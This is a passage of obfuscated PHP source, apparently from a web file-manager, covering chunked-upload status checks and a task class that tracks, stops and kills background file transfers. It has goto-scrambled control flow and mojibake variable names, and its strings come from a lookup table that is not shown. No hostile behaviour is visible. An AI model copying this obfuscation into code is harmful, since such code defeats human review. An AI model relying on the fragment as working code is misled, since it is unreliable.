$dø÷È“öšâ) { goto bäğŞ·õ±‰; eƒ‚‹·Œã: return !0; goto A™Æèêâà¼; f¸ËŒ‰é–: fclose($c¨°ëµ); fclose($aœ«‚‘¹); CacheLock::unlock($fÃ©ĞÁì¶); goto eƒ‚‹·Œã; bäğŞ·õ±‰: $dĞ§Ğ˜šĞ =& $_SERVER[¼]; $fÃ©ĞÁì¶ = $dĞ§Ğ˜šĞ[1954] . $dø÷È“öšâ; $F¿éÖƒ = CacheLock::lock($fÃ©ĞÁì¶, 1); goto fí °ç‹¤¥; fí °ç‹¤¥: $c¨°ëµ = @fopen($f‡‚‘ÂÊš˜, $dĞ§Ğ˜šĞ[1483]); if (!$c¨°ëµ || !$aœ«‚‘¹ || !$F¿éÖƒ) { CacheLock::unlock($fÃ©ĞÁì¶); return !1; } while (!feof($c¨°ëµ)) { fwrite($aœ«‚‘¹, fread($c¨°ëµ, 1024 * 200)); } goto f¸ËŒ‰é–; A™Æèêâà¼: } private function statusGet() { goto A›‘¯â“ê§; E˜Ñ§ƒë‹: if (!$this->statusData) { $aãÖ¼¨â‘ = array($AÁÉ—¬îÂ[28] => $this->fileName, $AÁÉ—¬îÂ[1942] => 0, $AÁÉ—¬îÂ[1943] => array()); $this->statusSet($aãÖ¼¨â‘); } return $this->statusData; goto cåŒ¯‹†ù; A¤§É‘Ñß‚: $DªÄ‡êœèè = !1; if (file_exists($e¥¾ê…Øå”)) { $DªÄ‡êœèè = @file_get_contents($e¥¾ê…Øå”); } if ($DªÄ‡êœèè) { $this->statusData = unserialize($DªÄ‡êœèè); } goto E˜Ñ§ƒë‹; A›‘¯â“ê§: $AÁÉ—¬îÂ =& $_SERVER[¼]; if (is_array($this->statusData)) { return $this->statusData; } $e¥¾ê…Øå” = $this->tempFile . $AÁÉ—¬îÂ[1955]; goto A¤§É‘Ñß‚; cåŒ¯‹†ù: } public function statusSet($E³±Å‡™•Ÿ) { $CÑ­Ñâğ»Ô = $this->tempFile . $_SERVER[¼][1955]; if (!$E³±Å‡™•Ÿ) { if (file_exists($CÑ­Ñâğ»Ô)) { @unlink($CÑ­Ñâğ»Ô); } return !0; } $this->statusData = $E³±Å‡™•Ÿ; return file_put_contents($CÑ­Ñâğ»Ô, serialize($E³±Å‡™•Ÿ)); } private function initFileTemp() { $f…Ó¡•Æ† =& $_SERVER[¼]; if (file_exists($this->tempFile)) { return; } $B¬İ×ÓØ¤– = fopen($this->tempFile, $f…Ó¡•Æ†[1956]); fseek($B¬İ×ÓØ¤–, $this->in[$f…Ó¡•Æ†[77]] - 1, SEEK_SET); fwrite($B¬İ×ÓØ¤–, $f…Ó¡•Æ†[464]); fclose($B¬İ×ÓØ¤–); } public function checkChunk() { goto e÷¯¬Œ—‚; a‘‹Û²ÓÈ: $c¹Óâ©ºÂƒ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($c¹Óâ©ºÂƒ[$a¬æããìƒŸ[1943]] as $Eò†ê±¾‡±) { $CŞ¼Ê¸çò = $Eò†ê±¾‡±[$a¬æããìƒŸ[161]]; if ($CŞ¼Ê¸çò) { $a¾ÈÌªƒñ[$a¬æããìƒŸ[1957] . $Eò†ê±¾‡±[$a¬æããìƒŸ[1029]]] = $CŞ¼Ê¸çò; } } goto E¹ˆï«øğÎ; e÷¯¬Œ—‚: $a¬æããìƒŸ =& $_SERVER[¼]; $a¾ÈÌªƒñ = array(); CacheLock::lock($this->tempFile); goto a‘‹Û²ÓÈ; E¹ˆï«øğÎ: return $a¾ÈÌªƒñ; goto C¥ÒåïÖÍ; C¥ÒåïÖÍ: } private function checkChunkHash($FÒ›Òğ‹) { goto EĞâÓ¢¡Ï¼; FªÔ¬–…°Õ: $a‡…¶Ø§‹š = _get($this->in, $d·¨ÚŒëÔé[1958]); if (strlen($a‡…¶Ø§‹š) == 32 && IO::hashSimple($this->tempFile) == $f…è‰—“Â && IO::hashMd5($this->tempFile) == $a‡…¶Ø§‹š) { return !0; } $dâ¤Öë†öÅ = fopen($this->tempFile, $d·¨ÚŒëÔé[1155]); goto c¥ïª¹ù¼…; EĞâÓ¢¡Ï¼: $d·¨ÚŒëÔé =& $_SERVER[¼]; if (count($FÒ›Òğ‹[$d·¨ÚŒëÔé[1943]]) != $FÒ›Òğ‹[$d·¨ÚŒëÔé[1942]]) { return !1; } $f…è‰—“Â = _get($this->in, $d·¨ÚŒëÔé[1950]); goto FªÔ¬–…°Õ; dŠªÊëƒˆ: return $D×ØßïöÈ; goto DùïÈĞ‚Õš; c¥ïª¹ù¼…: $D×ØßïöÈ = !0; foreach ($FÒ›Òğ‹[$d·¨ÚŒëÔé[1943]] as $fÏŸšî¾â«) { fseek($dâ¤Öë†öÅ, $fÏŸšî¾â«[$d·¨ÚŒëÔé[1945]]); $D¢–¾¶ì• = PathDriverStream::hash($dâ¤Öë†öÅ, $fÏŸšî¾â«[$d·¨ÚŒëÔé[77]]); if ($fÏŸšî¾â«[$d·¨ÚŒëÔé[161]] != $D¢–¾¶ì•) { $D×ØßïöÈ = !1; break; } } fclose($dâ¤Öë†öÅ); goto dŠªÊëƒˆ; DùïÈĞ‚Õš: } public static function fileName() { goto d§­Íè†ˆš; FÔİ„´ôõ’: if ($dã×¨´ù¬ == $FÖĞ·‡¥¥¯[1960] || $dã×¨´ù¬ == $FÖĞ·‡¥¥¯[1961]) { $c‘ÔÜ›Çœª = date($FÖĞ·‡¥¥¯[682], $bÀ¡¢Ô†‰) . $FÖĞ·‡¥¥¯[70] . $in[$FÖĞ·‡¥¥¯[77]] . $FÖĞ·‡¥¥¯[1592]; } else { if ($dã×¨´ù¬ == $FÖĞ·‡¥¥¯[1962]) { $c‘ÔÜ›Çœª = date($FÖĞ·‡¥¥¯[682], $bÀ¡¢Ô†‰) . $FÖĞ·‡¥¥¯[70] . $in[$FÖĞ·‡¥¥¯[77]] . $FÖĞ·‡¥¥¯[1963]; } } return $c‘ÔÜ›Çœª; goto b·ë™´¯§Í; e©§—Æ³Ê: $bÀ¡¢Ô†‰ = strtotime($in[$FÖĞ·‡¥¥¯[1959]]); $bÀ¡¢Ô†‰ = $bÀ¡¢Ô†‰ ? $bÀ¡¢Ô†‰ : time(); $dã×¨´ù¬ = strtolower($c‘ÔÜ›Çœª); goto FÔİ„´ôõ’; d§­Íè†ˆš: $FÖĞ·‡¥¥¯ =& $_SERVER[¼]; global $in; $c‘ÔÜ›Çœª = isset($in[$FÖĞ·‡¥¥¯[28]]) ? $in[$FÖĞ·‡¥¥¯[28]] : $FÖĞ·‡¥¥¯[33]; goto b«‘ÔÈ¥÷Š; b«‘ÔÈ¥÷Š: if (!empty($_FILES)) { $c‘ÔÜ›Çœª = $c‘ÔÜ›Çœª ? $c‘ÔÜ›Çœª : $_FILES[$FÖĞ·‡¥¥¯[164]][$FÖĞ·‡¥¥¯[383]]; } $c‘ÔÜ›Çœª = str_replace(array($FÖĞ·‡¥¥¯[95], $FÖĞ·‡¥¥¯[8]), array($FÖĞ·‡¥¥¯[8], $FÖĞ·‡¥¥¯[93]), trim($c‘ÔÜ›Çœª)); if (!is_wap()) { return $c‘ÔÜ›Çœª; } goto e©§—Æ³Ê; b·ë™´¯§Í: } private function errorInfo($cİ“¦Ä½˜µ) { $Dà‰¡¢ÂÀ³ =& $_SERVER[¼]; $côˆäõ»Å = array($Dà‰¡¢ÂÀ³[1964], $Dà‰¡¢ÂÀ³[1965], $Dà‰¡¢ÂÀ³[1966], $Dà‰¡¢ÂÀ³[1967], $Dà‰¡¢ÂÀ³[1968], $Dà‰¡¢ÂÀ³[1969], $Dà‰¡¢ÂÀ³[1970], $Dà‰¡¢ÂÀ³[1971]); return $cİ“¦Ä½˜µ . $Dà‰¡¢ÂÀ³[4] . $côˆäõ»Å[$cİ“¦Ä½˜µ]; } } goto cé…İê®¥Ÿ; a„†Ò©Šß: class Task { const STATYS_STOP = "\x73\164\x6f\x70"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\151\x6e\147"; const STATYS_KILL = "\153\151\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($e”®ë ±·È, $c÷³ö‡š‡î = '', $dÁöªìªƒ¾ = 0, $D’Íî¢¶Œ = '') { goto Cº‰‘©ƒ·; AÎ¦‚Úƒ‚: Hook::trigger($c¨ó‰”Š[1415], $this->task); $this->task[$c¨ó‰”Š[1409]] = timeFloat(); self::valueSet($this->task[$c¨ó‰”Š[364]], $this->task); goto b‰Ç²‘¤¤; Cº‰‘©ƒ·: $c¨ó‰”Š =& $_SERVER[¼]; if (self::get($e”®ë ±·È)) { return; } $this->task = array($c¨ó‰”Š[364] => $e”®ë ±·È, $c¨ó‰”Š[1404] => USER_ID, $c¨ó‰”Š[1312] => $D’Íî¢¶Œ, $c¨ó‰”Š[29] => $c÷³ö‡š‡î, $c¨ó‰”Š[973] => $c¨ó‰”Š[33], $c¨ó‰”Š[971] => $dÁöªìªƒ¾, $c¨ó‰”Š[983] => 0, $c¨ó‰”Š[1405] => 0, $c¨ó‰”Š[1406] => 0, $c¨ó‰”Š[1407] => timeFloat(), $c¨ó‰”Š[1408] => 0, $c¨ó‰”Š[1409] => 0, $c¨ó‰”Š[1410] => 0, $c¨ó‰”Š[1411] => 0, $c¨ó‰”Š[681] => $c¨ó‰”Š[1368]); goto Bğ†µåÆ´; Bğ†µåÆ´: Hook::bind($c¨ó‰”Š[1370], array($this, $c¨ó‰”Š[1412])); Hook::bind($c¨ó‰”Š[1413], array($this, $c¨ó‰”Š[1414])); $this->startAfter(); goto AÎ¦‚Úƒ‚; b‰Ç²‘¤¤: } public function end() { goto Bì­­ï®ê÷; eõÕñŸß: Hook::unbind($B½—å†‡´©[1413], array($this, $B½—å†‡´©[1414])); $this->endAfter(); $this->task = !1; goto A¨¿ ÅáÜ‹; Bì­­ï®ê÷: $B½—å†‡´© =& $_SERVER[¼]; if (!$this->task) { return; } if ($this->task[$B½—å†‡´©[1409]]) { self::valueSet($this->task[$B½—å†‡´©[364]], !1); } goto EĞ÷àØã†; EĞ÷àØã†: $CñìÒ·¢ = timeFloat() - $this->task[$B½—å†‡´©[1407]]; self::log($B½—å†‡´©[1416] . $this->task[$B½—å†‡´©[364]] . $B½—å†‡´©[1417] . $CñìÒ·¢ . $B½—å†‡´©[1418]); Hook::unbind($B½—å†‡´©[1370], array($this, $B½—å†‡´©[1412])); goto eõÕñŸß; A¨¿ ÅáÜ‹: } public function update($D¿¤ÅÖ‘ = 0) { goto CßÓÈÎ‹šµ; cï¶œÀŠÁ: Hook::trigger($C¶‡³ÒŠ™É[1422], $D¥ŒÁßª×); self::valueSet($D¥ŒÁßª×[$C¶‡³ÒŠ™É[364]], $D¥ŒÁßª×); goto DÁ‡¸ÚÛò”; d±ª†®†Î: $this->updateAfter(); $Eë¸®Ö¿ø– = 0.2; if (timeFloat() - $D¥ŒÁßª×[$C¶‡³ÒŠ™É[1409]] < $Eë¸®Ö¿ø–) { return; } goto aÚÜ¤öá®; aÂ´áŒù: $D¥ŒÁßª×[$C¶‡³ÒŠ™É[983]] += $D¿¤ÅÖ‘; $D¥ŒÁßª×[$C¶‡³ÒŠ™É[1408]] = timeFloat(); if ($D¥ŒÁßª×[$C¶‡³ÒŠ™É[971]]) { if ($D¥ŒÁßª×[$C¶‡³ÒŠ™É[971]] < $D¥ŒÁßª×[$C¶‡³ÒŠ™É[983]]) { $D¥ŒÁßª×[$C¶‡³ÒŠ™É[971]] = $D¥ŒÁßª×[$C¶‡³ÒŠ™É[983]]; } $fğÏ£•İÄ = timeFloat() - $D¥ŒÁßª×[$C¶‡³ÒŠ™É[1407]] - $D¥ŒÁßª×[$C¶‡³ÒŠ™É[1410]]; $D¥ŒÁßª×[$C¶‡³ÒŠ™É[1405]] = $D¥ŒÁßª×[$C¶‡³ÒŠ™É[983]] / $D¥ŒÁßª×[$C¶‡³ÒŠ™É[971]]; $D¥ŒÁßª×[$C¶‡³ÒŠ™É[1406]] = $D¥ŒÁßª×[$C¶‡³ÒŠ™É[983]] / $fğÏ£•İÄ; if ($D¥ŒÁßª×[$C¶‡³ÒŠ™É[1405]] > 0) { $D¥ŒÁßª×[$C¶‡³ÒŠ™É[1411]] = $fğÏ£•İÄ * (1 - $D¥ŒÁßª×[$C¶‡³ÒŠ™É[1405]]) / $D¥ŒÁßª×[$C¶‡³ÒŠ™É[1405]]; } $D¥ŒÁßª×[$C¶‡³ÒŠ™É[1411]] = $D¥ŒÁßª×[$C¶‡³ÒŠ™É[1411]] <= 0 ? 0 : $D¥ŒÁßª×[$C¶‡³ÒŠ™É[1411]]; } goto d±ª†®†Î; aÚÜ¤öá®: $A¹Ûš‰ÅˆÂ = self::get($D¥ŒÁßª×[$C¶‡³ÒŠ™É[364]]); $E‹“éÎ®œñ = $A¹Ûš‰ÅˆÂ[$C¶‡³ÒŠ™É[681]]; if ($E‹“éÎ®œñ == self::STATYS_KILL) { $Dİ¶…¸¨… = array($C¶‡³ÒŠ™É[1419] => LNG($C¶‡³ÒŠ™É[1420]), $C¶‡³ÒŠ™É[1025] => !1); Cache::set($C¶‡³ÒŠ™É[1421] . $this->task[$C¶‡³ÒŠ™É[364]], $Dİ¶…¸¨…, 30); $this->end(); die; } else { if ($E‹“éÎ®œñ == self::STATYS_STOP) { $dÄÂÁÂÇ† = 2; $A¹Ûš‰ÅˆÂ[$C¶‡³ÒŠ™É[1410]] += $dÄÂÁÂÇ†; self::valueSet($D¥ŒÁßª×[$C¶‡³ÒŠ™É[364]], $A¹Ûš‰ÅˆÂ); sleep($dÄÂÁÂÇ†); $this->update(); return; } } goto fœòÖŸÖáº; CßÓÈÎ‹šµ: $C¶‡³ÒŠ™É =& $_SERVER[¼]; $D¥ŒÁßª× =& $this->task; if (!$D¥ŒÁßª×) { return; } goto aÂ´áŒù; fœòÖŸÖáº: $D¥ŒÁßª×[$C¶‡³ÒŠ™É[681]] = $E‹“éÎ®œñ ? $E‹“éÎ®œñ : $D¥ŒÁßª×[$C¶‡³ÒŠ™É[681]]; $D¥ŒÁßª×[$C¶‡³ÒŠ™É[1410]] = $A¹Ûš‰ÅˆÂ[$C¶‡³ÒŠ™É[1410]] ? $A¹Ûš‰ÅˆÂ[$C¶‡³ÒŠ™É[1410]] : 0; $D¥ŒÁßª×[$C¶‡³ÒŠ™É[1409]] = timeFloat(); goto cï¶œÀŠÁ; DÁ‡¸ÚÛò”: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($c‡ÑÏ—ùÑ®) { $f¡î—“’èğ =& $_SERVER[¼]; Cache::set($f¡î—“’èğ[1421] . $this->task[$f¡î—“’èğ[364]], $c‡ÑÏ—ùÑ®, 60); return $c‡ÑÏ—ùÑ®; } public static function get($D Œ¿¤”¢) { return self::valueGet($D Œ¿¤”¢); } public static function listData() { $dÜéÕÄ…Ò = self::valueGet(); return array_sort_by($dÜéÕÄ…Ò, $_SERVER[¼][1407], !0); } public static function kill($Dëñ£àŞˆ³) { return self::changeStatus($Dëñ£àŞˆ³, self::STATYS_KILL); } public static function stop($aÍá„îšâµ) { return self::changeStatus($aÍá„îšâµ, self::STATYS_STOP); } public static function restart($fÚØ×¸áÌ) { return self::changeStatus($fÚØ×¸áÌ, self::STATYS_RUNNING); } public static function killAll() { $aÔ÷æ¤…†È =& $_SERVER[¼]; $eİõµĞëä† = self::listData(); foreach ($eİõµĞëä† as $EæÖ‰—ÛÜ˜) { self::kill($EæÖ‰—ÛÜ˜[$aÔ÷æ¤…†È[364]]); } sleep(2); foreach ($eİõµĞëä† as $EæÖ‰—ÛÜ˜) { self::valueSet($EæÖ‰—ÛÜ˜[$aÔ÷æ¤…†È[364]], !1); } } private static function changeStatus($e› Öº‚çŠ, $A­¨ñ›„Ú) { goto B™íè‘ÑÖê; AÌÆÈ˜ƒÙ: $Dñ½ŞŒì—Ú[$B‘”Ü“œåï[681]] = $A­¨ñ›„Ú; self::valueSet($e› Öº‚çŠ, $Dñ½ŞŒì—Ú); self::log($B‘”Ü“œåï[1423] . $Dñ½ŞŒì—Ú[$B‘”Ü“œåï[364]] . $B‘”Ü“œåï[1424] . $A­¨ñ›„Ú); goto fš¥åè–ï‹; B™íè‘ÑÖê: $B‘”Ü“œåï =& $_SERVER[¼]; $Dñ½ŞŒì—Ú = self::valueGet($e› Öº‚çŠ); if (!$Dñ½ŞŒì—Ú) { return !1; } goto AÌÆÈ˜ƒÙ; fš¥åè–ï‹: return !0; goto F’øÈà½èâ; F’øÈà½èâ: } public static function valueGet($b–ò›¢í = false) { $eù¼¼Âôšî =& $_SERVER[¼]; if ($b–ò›¢í) { $e…Ïê›Àˆ™ = Model($eù¼¼Âôšî[395])->where(array($eù¼¼Âôšî[89] => $b–ò›¢í, $eù¼¼Âôšî[29] => $eù¼¼Âôšî[1425]))->find(); return $e…Ïê›Àˆ™ ? json_decode($e…Ïê›Àˆ™[$eù¼¼Âôšî[356]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($fŞˆÜ¢Çç = false) { goto BØ’Ç×Ò×; BØ’Ç×Ò×: $AË±áëéæ¬ =& $_SERVER[¼]; $cÃµ‹¥Ç˜ = array($AË±áëéæ¬[29] => $AË±áëéæ¬[1425]); if ($fŞˆÜ¢Çç) { $cÃµ‹¥Ç˜[$AË±áëéæ¬[1404]] = $fŞˆÜ¢Çç; } goto fÒí½“»õö; fÒí½“»õö: $d±³Õåß° = Model($AË±áëéæ¬[395])->where($cÃµ‹¥Ç˜)->select(); $d±³Õåß° = $d±³Õåß° ? $d±³Õåß° : array(); foreach ($d±³Õåß° as $a±ß›Šç => $A†·©ÌÇá’) { $d±³Õåß°[$a±ß›Šç] = json_decode($A†·©ÌÇá’[$AË±áëéæ¬[356]], !0); } goto EÖŒ÷™£Ä; EÖŒ÷™£Ä: return $d±³Õåß°; goto FØİ¡Ìˆ²Ç; FØİ¡Ìˆ²Ç: } public static function valueSet($Fœ“¹¼¤æ·, $D„‘ŠâÓĞ) { goto BÆ„°‚°‰õ; aÙŒÚ¡ºÇÖ: if (!$eù‡õ œ¼ˆ) { ob_start(); var_dump($D„‘ŠâÓĞ); $Eùç–İå»› = ob_get_clean(); self::log($D„À³ÅŒÍ[1426] . json_encode_force($Eùç–İå»›)); } if (!$Fœ“¹¼¤æ· || !$D„‘ŠâÓĞ[$D„À³ÅŒÍ[364]]) { return !1; } $c„‚ˆ¾íó“ = array($D„À³ÅŒÍ[29] => $D„À³ÅŒÍ[1425], $D„À³ÅŒÍ[1404] => USER_ID, $D„À³ÅŒÍ[89] => $Fœ“¹¼¤æ·, $D„À³ÅŒÍ[356] => $eù‡õ œ¼ˆ); goto bã—ˆ¬®®¡; BÆ„°‚°‰õ: $D„À³ÅŒÍ =& $_SERVER[¼]; if (!$D„‘ŠâÓĞ) { return Model($D„À³ÅŒÍ[395])->where(array($D„À³ÅŒÍ[89] => $Fœ“¹¼¤æ·, $D„À³ÅŒÍ[29] => $D„À³ÅŒÍ[1425]))->delete(); } $eù‡õ œ¼ˆ = json_encode($D„‘ŠâÓĞ); goto aÙŒÚ¡ºÇÖ; bã—ˆ¬®®¡: Model($D„À³ÅŒÍ[395])->add($c„‚ˆ¾íó“, array(), !0); goto Aùğçñï‡ó; Aùğçñï‡ó: } public static function log($a¡òî¿¯¬ó) { write_log($a¡òî¿¯¬ó, $_SERVER[¼][1427]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto a¬¦ºÓ¤ø; AÔÏç¢¯ªé: Hook::bind($DÑ‰™êòæ[1428], array($this, $DÑ‰™êòæ[1429])); Hook::bind($DÑ‰™êòæ[1430], array($this, $DÑ‰™êòæ[1431])); Hook::bind($DÑ‰™êòæ[1432], array($this, $DÑ‰™êòæ[1433])); goto F†ÌŒÙğ«•; aõ‚âêÛ®: $eö÷¡ “¾’[$DÑ‰™êòæ[1447]] = LNG($DÑ‰™êòæ[1448]); $eö÷¡ “¾’[$DÑ‰™êòæ[1449]] = 0; $eö÷¡ “¾’[$DÑ‰™êòæ[1450]] = 0; goto b»Ã„•–ì; F¾ùÚÛÌãÚ: Hook::bind($DÑ‰™êòæ[1438], array($this, $DÑ‰™êòæ[1439])); Hook::bind($DÑ‰™êòæ[528], array($this, $DÑ‰™êòæ[1440])); $this->sourceModelCopyFlag = !1; goto DÇÃáÊãí; DÇÃáÊãí: Hook::bind($DÑ‰™êòæ[1441], array($this, $DÑ‰™êòæ[1442])); Hook::bind($DÑ‰™êòæ[1443], array($this, $DÑ‰™êòæ[1444])); Hook::bind($DÑ‰™êòæ[1445], array($this, $DÑ‰™êòæ[1446])); goto aõ‚âêÛ®; A²ªÖš®ìá: Hook::bind($DÑ‰™êòæ[507], array($this, $DÑ‰™êòæ[1437])); Hook::bind($DÑ‰™êòæ[509], array($this, $DÑ‰™êòæ[1437])); Hook::bind($DÑ‰™êòæ[511], array($this, $DÑ‰™êòæ[1437])); goto F¾ùÚÛÌãÚ; F†ÌŒÙğ«•: Hook::bind($DÑ‰™êòæ[535], array($this, $DÑ‰™êòæ[1434])); Hook::bind($DÑ‰™êòæ[536], array($this, $DÑ‰™êòæ[1435])); Hook::bind($DÑ‰™êòæ[538], array($this, $DÑ‰™êòæ[1436])); goto c˜Àˆ¬â²ƒ; c˜Àˆ¬â²ƒ: Hook::bind($DÑ‰™êòæ[539], array($this, $DÑ‰™êòæ[1436])); Hook::bind($DÑ‰™êòæ[505], array($this, $DÑ‰™êòæ[1437])); Hook::bind($DÑ‰™êòæ[502], array($this, $DÑ‰™êòæ[1437])); goto A²ªÖš®ìá; a¬¦ºÓ¤ø: $DÑ‰™êòæ =& $_SERVER[¼]; $eö÷¡ “¾’ =& $this->task; $this->sourceCopyFolder = !1; goto AÔÏç¢¯ªé; BƒÖèØŠ’Õ: if (!$eö÷¡ “¾’[$DÑ‰™êòæ[1312]]) { $eö÷¡ “¾’[$DÑ‰™êòæ[1312]] = LNG($DÑ‰™êòæ[1453]); } goto eÂ‹Ò³„Šõ; b»Ã„•–ì: $eö÷¡ “¾’[$DÑ‰™êòæ[973]] = $DÑ‰™êòæ[33]; $eö÷¡ “¾’[$DÑ‰™êòæ[1451]] = $DÑ‰™êòæ[33]; $eö÷¡ “¾’[$DÑ‰™êòæ[1452]] = 0; goto BƒÖèØŠ’Õ; eÂ‹Ò³„Šõ: } protected function endAfter() { goto eò²Û”„‘; Dà‡Àë»í: Hook::unbind($BçÃİ“¾¢”[1441], array($this, $BçÃİ“¾¢”[1442])); Hook::unbind($BçÃİ“¾¢”[1443], array($this, $BçÃİ“¾¢”[1444])); Hook::unbind($BçÃİ“¾¢”[1445], array($this, $BçÃİ“¾¢”[1446])); goto b²ëöË“ÔÁ; e’ÔÉ®ˆ¬š: Hook::unbind($BçÃİ“¾¢”[502], array($this, $BçÃİ“¾¢”[1437])); Hook::unbind($BçÃİ“¾¢”[507], array($this, $BçÃİ“¾¢”[1437])); Hook::unbind($BçÃİ“¾¢”[509], array($this, $BçÃİ“¾¢”[1437])); goto FÁÍÑ¿ùæà; eò²Û”„‘: $BçÃİ“¾¢” =& $_SERVER[¼]; Hook::unbind($BçÃİ“¾¢”[1428], array($this, $BçÃİ“¾¢”[1429])); Hook::unbind($BçÃİ“¾¢”[1430], array($this, $BçÃİ“¾¢”[1431])); goto Dõ‰­óóê; FÁÍÑ¿ùæà: Hook::unbind($BçÃİ“¾¢”[511], array($this, $BçÃİ“¾¢”[1437])); Hook::unbind($BçÃİ“¾¢”[1438], array($this, $BçÃİ“¾¢”[1439])); Hook::unbind($BçÃİ“¾¢”[528], array($this, $BçÃİ“¾¢”[1440])); goto Dà‡Àë»í; Dõ‰­óóê: Hook::unbind($BçÃİ“¾¢”[1432], array($this, $BçÃİ“¾¢”[1433])); Hook::unbind($BçÃİ“¾¢”[535], array($this, $BçÃİ“¾¢”[1434])); Hook::unbind($BçÃİ“¾¢”[536], array($this, $BçÃİ“¾¢”[1435])); goto CªŒé±Ş˜„; CªŒé±Ş˜„: Hook::unbind($BçÃİ“¾¢”[538], array($this, $BçÃİ“¾¢”[1436])); Hook::unbind($BçÃİ“¾¢”[539], array($this, $BçÃİ“¾¢”[1436])); Hook::unbind($BçÃİ“¾¢”[505], array($this, $BçÃİ“¾¢”[1437])); goto e’ÔÉ®ˆ¬š; b²ëöË“ÔÁ: } public function copyMoveStart($dé³ÈÖ„•Ş, $dÔù«“ãƒĞ, $b¸ÔÚ®›™Û, $e°Ì™ŠØ‘‘) { } public function updateAfter() { goto A›®­©¦‘ª; e¡­«¨àñ™: if ($this->sourceModelCopyFlag) { return; } $b÷—Š¿Š = 0; if ($Fèîø”è‚[$A‘Ö¡õ¼®[1451]] == $A‘Ö¡õ¼®[1033]) { $b÷—Š¿Š = $Fèîø”è‚[$A‘Ö¡õ¼®[1450]] * 0.5; } else { if ($Fèîø”è‚[$A‘Ö¡õ¼®[1451]] == $A‘Ö¡õ¼®[91]) { $b÷—Š¿Š = $Fèîø”è‚[$A‘Ö¡õ¼®[1450]] * 0.5 + $Fèîø”è‚[$A‘Ö¡õ¼®[1449]] * 0.5; } } goto EÖ÷èÅ­—; A›®­©¦‘ª: $A‘Ö¡õ¼® =& $_SERVER[¼]; $Fèîø”è‚ =& $this->task; if (!$Fèîø”è‚[$A‘Ö¡õ¼®[690]]) { return; } goto e¡­«¨àñ™; EÖ÷èÅ­—: $Fèîø”è‚[$A‘Ö¡õ¼®[1405]] = ($Fèîø”è‚[$A‘Ö¡õ¼®[1454]] + $b÷—Š¿Š) / $Fèîø”è‚[$A‘Ö¡õ¼®[690]]; if ($Fèîø”è‚[$A‘Ö¡õ¼®[1405]] > 0) { $D˜±ÖÆõ¥Û = timeFloat() - $Fèîø”è‚[$A‘Ö¡õ¼®[1407]] - $Fèîø”è‚[$A‘Ö¡õ¼®[1410]]; $Fèîø”è‚[$A‘Ö¡õ¼®[1411]] = $D˜±ÖÆõ¥Û * (1 - $Fèîø”è‚[$A‘Ö¡õ¼®[1405]]) / $Fèîø”è‚[$A‘Ö¡õ¼®[1405]]; } goto aèíä›‚á†; aèíä›‚á†: } public function addPath($AÖ’åö½î) { goto eˆï÷›‰š; BÎÙ‘‚…•: $BŒ©‹İÕ½ = IO::infoWithChildren($AÖ’åö½î); $aÈ¨®À°¶‹ = $AÔ«»©±š[$Eõù•öôŞ­[1455]] ? $AÔ«»©±š[$Eõù•öôŞ­[1455]][$Eõù•öôŞ­[1456]] : 0; $AÔ«»©±š[$Eõù•öôŞ­[1455]] = array($Eõù•öôŞ­[1456] => $aÈ¨®À°¶‹ + 1, $Eõù•öôŞ­[383] => $BŒ©‹İÕ½[$Eõù•öôŞ­[28]], $Eõù•öôŞ­[75] => $BŒ©‹İÕ½[$Eõù•öôŞ­[75]], $Eõù•öôŞ­[462] => $BŒ©‹İÕ½[$Eõù•öôŞ­[462]] ? $BŒ©‹İÕ½[$Eõù•öôŞ­[462]] : $BŒ©‹İÕ½[$Eõù•öôŞ­[75]]); goto dÖğÓëøµ‹; dÖğÓëøµ‹: if ($BŒ©‹İÕ½[$Eõù•öôŞ­[29]] == $Eõù•öôŞ­[164]) { $AÔ«»©±š[$Eõù•öôŞ­[971]] += 1; } else { $AÔ«»©±š[$Eõù•öôŞ­[971]] += $BŒ©‹İÕ½[$Eõù•öôŞ­[80]][$Eõù•öôŞ­[78]]; if ($BŒ©‹İÕ½[$Eõù•öôŞ­[366]]) { $AÔ«»©±š[$Eõù•öôŞ­[971]] += $BŒ©‹İÕ½[$Eõù•öôŞ­[80]][$Eõù•öôŞ­[79]] + 1; } } $AÔ«»©±š[$Eõù•öôŞ­[690]] += $BŒ©‹İÕ½[$Eõù•öôŞ­[77]]; $this->update(); goto d¡’©ô°Ñ; eˆï÷›‰š: $Eõù•öôŞ­ =& $_SERVER[¼]; if (!$AÖ’åö½î) { return; } $AÔ«»©±š =& $this->task; goto BÎÙ‘‚…•; d¡’©ô°Ñ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($A°æˆœÁå) { $CÂÁ‹ì±½î =& $_SERVER[¼]; $c‰¸Ó“˜œ =& $this->task; $c‰¸Ó“˜œ[$CÂÁ‹ì±½î[1447]] = $A°æˆœÁå[$CÂÁ‹ì±½î[28]]; $c‰¸Ó“˜œ[$CÂÁ‹ì±½î[973]] = $A°æˆœÁå[$CÂÁ‹ì±½î[28]]; $this->update(); } public function copyFileStart($eßã¥±†ñ‹, $E”•¸Á–Í, $b¬¹¤´ŠÛ¾, $Eáªã®§ˆ, $c‡Ç«¯Øº, $A‚°‚×‰Ú) { goto CôŠ¬ï¯©; CôŠ¬ï¯©: $Bö®¥ÇÏ×õ =& $_SERVER[¼]; $f”Å¢»‚¯— = $c‡Ç«¯Øº; if ($f”Å¢»‚¯— == $GLOBALS[$Bö®¥ÇÏ×õ[1457]]) { $f”Å¢»‚¯— = $GLOBALS[$Bö®¥ÇÏ×õ[1458]]; } goto Béó³¾èíÊ; Béó³¾èíÊ: $GLOBALS[$Bö®¥ÇÏ×õ[1458]] = $c‡Ç«¯Øº; $GLOBALS[$Bö®¥ÇÏ×õ[1457]] = $A‚°‚×‰Ú; $c«ÒÈã¢ÜÆ =& $this->task; goto FŠİ³Ğ‚ç×; f©ïØ‘Ì¸: $this->update(); goto Cºº¼°×²Í; B¼ÉİœĞäñ: $c«ÒÈã¢ÜÆ[$Bö®¥ÇÏ×õ[973]] = $Bö®¥ÇÏ×õ[33]; $c«ÒÈã¢ÜÆ[$Bö®¥ÇÏ×õ[1451]] = $Bö®¥ÇÏ×õ[33]; $c«ÒÈã¢ÜÆ[$Bö®¥ÇÏ×õ[1452]] = 0; goto 